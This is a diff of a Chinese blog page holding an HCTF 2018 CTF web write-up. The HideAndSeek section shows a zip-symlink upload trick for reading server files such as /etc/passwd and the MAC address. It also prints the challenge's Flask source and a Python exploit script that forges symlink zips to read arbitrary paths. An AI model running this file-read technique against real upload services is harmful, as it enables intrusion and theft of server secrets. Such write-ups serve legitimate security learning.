@@ -141,7 +141,7 @@
 <meta property="og:image" content="http://static.zybuluo.com/Passer6y/gi0q1n5gqdhj6ddlrruvgmgs/image_1d2tqlpt2935hbp1ug01hc91ogi9.png">
 <meta property="og:image" content="http://static.zybuluo.com/Passer6y/x8p4udzjqszajlvh420l70ia/image_1d2tr01251e8bmvq5r8p43i8m.png">
 <meta property="og:image" content="http://static.zybuluo.com/Passer6y/f1ocjg7yf4dva04z7tuqsvq1/image_1d2trt9n9125b1u8bcajrf1jl613.png">
-<meta property="og:updated_time" content="2019-02-05T07:41:34.000Z">
+<meta property="og:updated_time" content="2020-03-19T11:16:35.017Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="HCTF 2018 Web Writeup">
 <meta name="twitter:description" content="近来有时间补了一下之前比赛遗留下来的wp">
@@ -176,7 +176,7 @@
     var _hmt = _hmt || [];
     (function() {
       var hm = document.createElement("script");
-      hm.src = "https://hm.baidu.com/hm.js?14e9c0326e763de8b0a61711cc963a58";
+      hm.src = "http://hm.baidu.com/hm.js?14e9c0326e763de8b0a61711cc963a58";
       var s = document.getElementsByTagName("script")[0];
       s.parentNode.insertBefore(hm, s);
     })();
@@ -454,12 +454,24 @@
                 
               
 
-              <time title="Created: 2019-02-05 15:51:00 / Modified: 15:41:34" itemprop="dateCreated datePublished" datetime="2019-02-05T15:51:00+08:00">2019-02-05</time>
+              <time title="Created: 2019-02-05 15:51:00" itemprop="dateCreated datePublished" datetime="2019-02-05T15:51:00+08:00">2019-02-05</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2020-03-19 19:16:35" itemprop="dateModified" datetime="2020-03-19T19:16:35+08:00">2020-03-19</time>
               
             
           </span>
@@ -535,7 +547,7 @@
 <p>当然也可以在密码一直比较错误的情形下利用：<br>用户名字段查询不到东西(为空)：set-cookie四次<br>用户名字段查询到东西：set-cookoe两次</p>
 <h2 id="HideAndSeek"><a href="#HideAndSeek" class="headerlink" title="HideAndSeek"></a>HideAndSeek</h2><p>注册后题目是一个上传zip文件的地方，会自动解压并渲染出文件内容。<br>奇怪的是提交完之后直接就在这样一个<br><code>http://206.189.144.143:20000/upload</code>路径下渲染了，也没有具体的文件名等信息。<br><img src="http://static.zybuluo.com/Passer6y/zwsywi592apqetatwhdkpwid/image_1d2sinmfjerubu1mqb3ubp2n9.png" alt="image_1d2sinmfjerubu1mqb3ubp2n9.png-135.9kB"></p>
 <p>如果再去访问upload会进行跳转，所以猜测是渲染一次之后就删了。<br>尝试构造文件名<code>../../../../../../etc/passwd</code>的压缩文件(瞎试的)，返回一片空白..<br>其次压缩文件里有目录结构，也会返回空白。</p>
-<p>网上找到一篇文件上传软连接的文章：<a href="https://xz.aliyun.com/t/2589" target="_blank" rel="noopener">https://xz.aliyun.com/t/2589</a></p>
+<p>网上找到一篇文件上传软连接的文章：<a href="http://xz.aliyun.com/t/2589" target="_blank" rel="noopener">http://xz.aliyun.com/t/2589</a></p>
 <p>构造软连接压缩文件<br><img src="http://static.zybuluo.com/Passer6y/x5hfrpxwel5kry6wjccq89bu/image_1d2tn76jklvg18c58u5q8ldabm.png" alt="image_1d2tn76jklvg18c58u5q8ldabm.png-53kB"></p>
 <p>zip -y 表示存储链接文件，不会替代源文件<br><img src="http://static.zybuluo.com/Passer6y/3dfj01cqoeqf49nmy00uetew/image_1d2tn8g1f13b411lssterek13qp1j.png" alt="image_1d2tn8g1f13b411lssterek13qp1j.png-11.2kB"></p>
 <p>上传压缩文件后得到：<br><img src="http://static.zybuluo.com/Passer6y/amiy8nrn32hi0olh92x4pxe0/image_1d2tn9v15pofqka17t56l3bvm20.png" alt="image_1d2tn9v15pofqka17t56l3bvm20.png-87.2kB"></p>
@@ -549,7 +561,7 @@
 <p>读出源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from flask import Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">import random</span><br><span class="line">import flag</span><br><span class="line">from werkzeug.utils import secure_filename</span><br><span class="line">import os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[&apos;SECRET_KEY&apos;] = str(random.random()*100)</span><br><span class="line">app.config[&apos;UPLOAD_FOLDER&apos;] = &apos;./uploads&apos;</span><br><span class="line">app.config[&apos;MAX_CONTENT_LENGTH&apos;] = 100 * 1024</span><br><span class="line">ALLOWED_EXTENSIONS = set([&apos;zip&apos;])</span><br><span class="line"></span><br><span class="line">def allowed_file(filename):</span><br><span class="line">    return &apos;.&apos; in filename and \</span><br><span class="line">           filename.rsplit(&apos;.&apos;, 1)[1].lower() in ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&apos;/&apos;, methods=[&apos;GET&apos;])</span><br><span class="line">def index():</span><br><span class="line">    error = request.args.get(&apos;error&apos;, &apos;&apos;)</span><br><span class="line">    if(error == &apos;1&apos;):</span><br><span class="line">        session.pop(&apos;username&apos;, None)</span><br><span class="line">        return render_template(&apos;index.html&apos;, forbidden=1)</span><br><span class="line"></span><br><span class="line">    if &apos;username&apos; in session:</span><br><span class="line">        return render_template(&apos;index.html&apos;, user=session[&apos;username&apos;], flag=flag.flag)</span><br><span class="line">    else:</span><br><span class="line">        return render_template(&apos;index.html&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&apos;/login&apos;, methods=[&apos;POST&apos;])</span><br><span class="line">def login():</span><br><span class="line">    username=request.form[&apos;username&apos;]</span><br><span class="line">    password=request.form[&apos;password&apos;]</span><br><span class="line">    if request.method == &apos;POST&apos; and username != &apos;&apos; and password != &apos;&apos;:</span><br><span class="line">        if(username == &apos;admin&apos;):</span><br><span class="line">            return redirect(url_for(&apos;index&apos;,error=1))</span><br><span class="line">        session[&apos;username&apos;] = username</span><br><span class="line">    return redirect(url_for(&apos;index&apos;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&apos;/logout&apos;, methods=[&apos;GET&apos;])</span><br><span class="line">def logout():</span><br><span class="line">    session.pop(&apos;username&apos;, None)</span><br><span class="line">    return redirect(url_for(&apos;index&apos;))</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/upload&apos;, methods=[&apos;POST&apos;])</span><br><span class="line">def upload_file():</span><br><span class="line">    if &apos;the_file&apos; not in request.files:</span><br><span class="line">        return redirect(url_for(&apos;index&apos;))</span><br><span class="line">    file = request.files[&apos;the_file&apos;]</span><br><span class="line">    if file.filename == &apos;&apos;:</span><br><span class="line">        return redirect(url_for(&apos;index&apos;))</span><br><span class="line">    if file and allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[&apos;UPLOAD_FOLDER&apos;], filename)</span><br><span class="line">        if(os.path.exists(file_save_path)):</span><br><span class="line">            return &apos;This file already exists&apos;</span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    else:</span><br><span class="line">        return &apos;This file is not a zipfile&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        extract_path = file_save_path + &apos;_&apos;</span><br><span class="line">        os.system(&apos;unzip -n &apos; + file_save_path + &apos; -d &apos;+ extract_path)</span><br><span class="line">        read_obj = os.popen(&apos;cat &apos; + extract_path + &apos;/*&apos;)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(&apos;rm -rf &apos; + extract_path)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        file = None</span><br><span class="line"></span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    if(file != None):</span><br><span class="line">        if(file.find(base64.b64decode(&apos;aGN0Zg==&apos;).decode(&apos;utf-8&apos;)) != -1):</span><br><span class="line">            return redirect(url_for(&apos;index&apos;, error=1))</span><br><span class="line">    return Response(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    #app.run(debug=True)</span><br><span class="line">    app.run(host=&apos;127.0.0.1&apos;, debug=True, port=10008)</span><br></pre></td></tr></table></figure></p>
 <p>看到他import了flag，直接去读flag，然鹅..直接被拦了<br><img src="http://static.zybuluo.com/Passer6y/f1ocjg7yf4dva04z7tuqsvq1/image_1d2trt9n9125b1u8bcajrf1jl613.png" alt="image_1d2trt9n9125b1u8bcajrf1jl613.png-61.6kB"></p>
 <p>所以现在思路就是越权成为admin，这里使用的一个固定的随机数种子，uuid.getnode()获得10进制mac地址，可以在/sys/class/net/eth0/address读到mac地址，所以可以伪造session越权称为admin，</p>
-<p>读到mac地址：<code>02:42:ac:11:00:02</code>，在线转成10进制：<br><a href="https://www.vultr.com/tools/mac-converter/?mac_address=02%3A42%3Aac%3A11%3A00%3A02" target="_blank" rel="noopener">https://www.vultr.com/tools/mac-converter/?mac_address=02%3A42%3Aac%3A11%3A00%3A02</a><br>得到种子：2485377892354</p>
+<p>读到mac地址：<code>02:42:ac:11:00:02</code>，在线转成10进制：<br><a href="http://www.vultr.com/tools/mac-converter/?mac_address=02%3A42%3Aac%3A11%3A00%3A02" target="_blank" rel="noopener">http://www.vultr.com/tools/mac-converter/?mac_address=02%3A42%3Aac%3A11%3A00%3A02</a><br>得到种子：2485377892354</p>
 <p>然后本地搭一下flask环境拿到session即可得到flag。</p>
 <p>最后看了其他师傅们的wp，还可以读.bash_history等等，这里嫖了一个exp(我全程手动操作的..)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import random </span><br><span class="line">import os</span><br><span class="line">import string</span><br><span class="line">import time</span><br><span class="line">import zipfile</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def generate_zip(path,i):</span><br><span class="line">    zip_name =  &apos;moxiaoxi&apos;+str(i)+&apos;.zip&apos;</span><br><span class="line">    link_namme = &apos;moxiaoxi&apos;+str(i)</span><br><span class="line">    os.system(&quot;ln -s &#123;&#125; &#123;&#125;&quot;.format(path,link_namme))</span><br><span class="line">    print &quot;ln -s &#123;&#125; &#123;&#125;&quot;.format(path,link_namme)</span><br><span class="line">    os.system(&quot;zip -y &#123;&#125; &#123;&#125;&quot;.format(zip_name,link_namme))</span><br><span class="line">    with open(zip_name,&apos;r&apos;) as f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    return zip_name,data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exp(path,i):</span><br><span class="line">    zip_name,data = generate_zip(path,i)</span><br><span class="line">    # zip_name,data = rewrite(path,i)</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    paramsPost = &#123;&quot;submit&quot;:&quot;Submit&quot;&#125;</span><br><span class="line">    paramsMultipart = [(&apos;the_file&apos;, (zip_name, data, &apos;application/zip&apos;))]</span><br><span class="line">    headers = &#123;&quot;Accept&quot;:&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,&quot;Upgrade-Insecure-Requests&quot;:&quot;1&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Linux; Android 9.0; SAMSUNG-SM-T377A Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Mobile Safari/537.36&quot;,&quot;Referer&quot;:&quot;http://hideandseek.2018.hctf.io/&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;Accept-Language&quot;:&quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;DNT&quot;:&quot;1&quot;&#125;</span><br><span class="line">    cookies = &#123;&quot;session&quot;:&quot;eyJ1c2VybmFtZSI6Im1veGlhb3hpIn0.Dsf5zA.yM84QphtcfEoykAu2lwjxp7_QvI&quot;&#125;</span><br><span class="line">    response = session.post(&quot;http://hideandseek.2018.hctf.io/upload&quot;, data=paramsPost, files=paramsMultipart, headers=headers, cookies=cookies)</span><br><span class="line"></span><br><span class="line">    print(&quot;Status code: %i&quot; % response.status_code)</span><br><span class="line">    print(&quot;Response body: %s&quot; % response.content)</span><br><span class="line">    if len(response.content)&gt;5:</span><br><span class="line">        # print(&quot;Response body: %s&quot; % response.content)</span><br><span class="line">        with open(&apos;out.txt&apos;,&apos;a+&apos;) as f:</span><br><span class="line">            f.write(&apos;\n\n&#123;&#125;\n\n&#123;&#125;&apos;.format(path,response.content)) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__==&apos;__main__&apos;:</span><br><span class="line">    name =  &apos;test&apos;+&apos;&apos;.join(random.sample(string.ascii_letters + string.digits, 4))</span><br><span class="line">    exp(sys.argv[1],name)</span><br></pre></td></tr></table></figure></p>
 
@@ -774,7 +786,7 @@
             <div class="links-of-author motion-element">
               
                 <span class="links-of-author-item">
-                  <a href="https://github.com/passer6y" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  <a href="http://github.com/passer6y" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
                   
                 </span>
               
@@ -799,7 +811,7 @@
               <ul class="links-of-blogroll-list">
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://hpdoger.cn/" title="Hpdoger" target="_blank">Hpdoger</a>
+                    <a href="http://hpdoger.cn/" title="Hpdoger" target="_blank">Hpdoger</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
@@ -807,19 +819,19 @@
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://www.0akarma.com/" title="0akarma" target="_blank">0akarma</a>
+                    <a href="http://www.0akarma.com/" title="0akarma" target="_blank">0akarma</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://www.cnblogs.com/H4lo" title="H4lo" target="_blank">H4lo</a>
+                    <a href="http://www.cnblogs.com/H4lo" title="H4lo" target="_blank">H4lo</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://www.cnblogs.com/P1g3/" title="P1g3" target="_blank">P1g3</a>
+                    <a href="http://www.cnblogs.com/P1g3/" title="P1g3" target="_blank">P1g3</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://patrilic.top/" title="Patrilic" target="_blank">Patrilic</a>
+                    <a href="http://patrilic.top/" title="Patrilic" target="_blank">Patrilic</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
@@ -827,11 +839,11 @@
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://threezh1.com/" title="Threezh1" target="_blank">Threezh1</a>
+                    <a href="http://threezh1.com/" title="Threezh1" target="_blank">Threezh1</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://blog.izgq.net/" title="ZGQ" target="_blank">ZGQ</a>
+                    <a href="http://blog.izgq.net/" title="ZGQ" target="_blank">ZGQ</a>
                   </li>
                 
               </ul>
